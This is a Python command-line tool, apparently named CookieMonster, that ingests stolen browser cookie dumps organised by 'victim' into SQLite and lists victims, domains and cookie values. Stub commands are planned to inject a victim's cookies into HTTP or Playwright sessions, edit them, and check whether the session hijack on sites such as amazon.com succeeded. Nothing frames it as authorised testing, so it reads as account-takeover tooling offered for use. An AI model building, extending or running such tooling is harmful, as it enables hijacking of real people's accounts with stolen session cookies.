"""Interface de linha de comando do CookieMonster."""

from __future__ import annotations

import click

from pathlib import Path

from . import __version__
from .ingest import ingest_dir
from .store.db import Store

from rich.console import Console
from rich.table import Table

console = Console()


def _load_store(db: str) -> Store:
    store = Store(db)
    store.init()
    return store


@click.group()
@click.version_option(__version__, prog_name="cookie-monster")
def cli():
    """CookieMonster - validador de session hijacking por cookie replay."""


@cli.command()
@click.option("--dir", "source_dir", type=click.Path(exists=True, file_okay=False,
                                                     path_type=Path), required=True,
              help="Diretorio raiz com as pastas de vítima (ex.: Cookies/)")
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True, help="Caminho do store SQLite")
@click.option("--sample", type=int, default=0,
              help="Limita a ingestao às N primeiras vítimas (teste)")
@click.option("--resume", is_flag=True,
              help="Pula vítimas já ingeridas (retomada de ingest incompleta)")
def ingest(source_dir: Path, db_path: Path, sample: int, resume: bool):
    """Ingere dumps de cookies (Netscape/JSON) no store SQLite."""
    store = _load_store(str(db_path))
    console.print("[bold]Ingerindo dumps de cookies...[/]")
    stats = ingest_dir(store, source_dir, sample=sample, resume=resume)
    console.print()

    table = Table(title="Ingestão concluída")
    table.add_column("Item", style="cyan")
    table.add_column("Valor", justify="right")
    for key in ("victims", "files", "json_files", "cookies", "malformed_lines"):
        table.add_row(key.replace("_", " "), str(stats[key]))
    table.add_row("pulados", str(stats.get("skipped", 0)))
    table.add_row("erros", str(len(stats["errors"])))
    console.print(table)

    if stats["errors"]:
        console.print("[yellow]Vítimas sem cookies:[/]")
        for err in stats["errors"][:20]:
            console.print(f"  {err}")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
def victims(db_path: Path):
    """Lista as vítimas ingeridas."""
    store = _load_store(str(db_path))
    rows = store.list_victims()
    table = Table(title="Vítimas")
    table.add_column("ID", justify="right", style="dim")
    table.add_column("Diretório")
    table.add_column("Layout")
    table.add_column("Cookies", justify="right")
    table.add_column("Domínios", justify="right")
    for row in rows:
        table.add_row(str(row["id"]), row["dir_name"], row["source_layout"],
                      str(row["cookie_count"]), str(row["domain_count"]))
    console.print(table)
    console.print(f"[dim]Total: {len(rows)} vítimas[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, default=None, help="Filtra por ID de vítima")
@click.option("--domain", default=None, help="Filtra por domínio (ex.: amazon.com)")
def domains(db_path: Path, victim: int | None, domain: str | None):
    """Lista domínios e contagem de cookies."""
    store = _load_store(str(db_path))
    rows = store.list_domains(victim_id=victim, domain=domain)
    table = Table(title="Domínios")
    table.add_column("Victim ID", justify="right", style="dim")
    table.add_column("Domínio")
    table.add_column("Cookies", justify="right")
    for row in rows:
        table.add_row(str(row["victim_id"]), row["domain"], str(row["cookie_count"]))
    console.print(table)
    console.print(f"[dim]Total: {len(rows)} linhas[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, required=True, help="ID da vítima")
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--limit", type=int, default=100, show_default=True)
@click.option("--show-value", is_flag=True, help="Exibe o valor do cookie")
def cookies(db_path: Path, victim: int, domain: str, limit: int, show_value: bool):
    """Lista cookies de uma vítima para um domínio (matcher leve, M1 refina)."""
    store = _load_store(str(db_path))
    rows = store.list_cookies(victim_id=victim, domain=domain, limit=limit)
    table = Table(title=f"Cookies - vítima {victim} - {domain}")
    table.add_column("Nome")
    table.add_column("Domínio")
    table.add_column("Path")
    table.add_column("Secure", justify="center")
    table.add_column("HttpOnly", justify="center")
    table.add_column("HostOnly", justify="center")
    table.add_column("Expira", justify="right")
    if show_value:
        table.add_column("Valor")
    for row in rows:
        expiry = row["expires_epoch"]
        expiry_s = "sessão" if not expiry else str(expiry)
        if show_value:
            table.add_row(row["name"], row["domain"], row["path"],
                          "yes" if row["secure"] else "-",
                          "yes" if row["http_only"] else "-",
                          "yes" if row["host_only"] else "-",
                          expiry_s, row["value"])
        else:
            table.add_row(row["name"], row["domain"], row["path"],
                          "yes" if row["secure"] else "-",
                          "yes" if row["http_only"] else "-",
                          "yes" if row["host_only"] else "-",
                          expiry_s)
    console.print(table)
    console.print(f"[dim]Total: {len(rows)} cookies[/]")


# ---- Stubs das fases seguintes ----

@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db")
@click.option("--victim", type=int, required=True)
@click.option("--domain", required=True)
@click.option("--url", required=True)
@click.option("--channel", type=click.Choice(["httpx", "playwright"]), default="playwright")
def inject(db_path: Path, victim: int, domain: str, url: str, channel: str):
    """[M2] Injeta os cookies da vítima num contexto de requisição."""
    console.print("[yellow]Não implementado - previsto na fase M2 (injeção & edição).[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db")
@click.option("--victim", type=int, required=True)
@click.option("--cookie", required=True)
@click.option("--value", required=True)
def edit(db_path: Path, victim: int, cookie: str, value: str):
    """[M2] Altera o valor de um cookie capturado (replay de artefato editado)."""
    console.print("[yellow]Não implementado - previsto na fase M2 (injeção & edição).[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db")
@click.option("--victim", type=int, required=True)
@click.option("--domain", required=True)
def check(db_path: Path, victim: int, domain: str):
    """[M3] Valida se o session hijack teve sucesso no domínio alvo."""
    console.print("[yellow]Não implementado - previsto na fase M3 (validação).[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db")
@click.option("--out", "out_dir", type=click.Path(path_type=Path), default="reports")
def report(db_path: Path, out_dir: Path):
    """[M4] Gera relatórios a partir do store."""
    console.print("[yellow]Não implementado - previsto na fase M4 (relatório).[/]")


def main() -> int:
    return cli()


if __name__ == "__main__":
    main()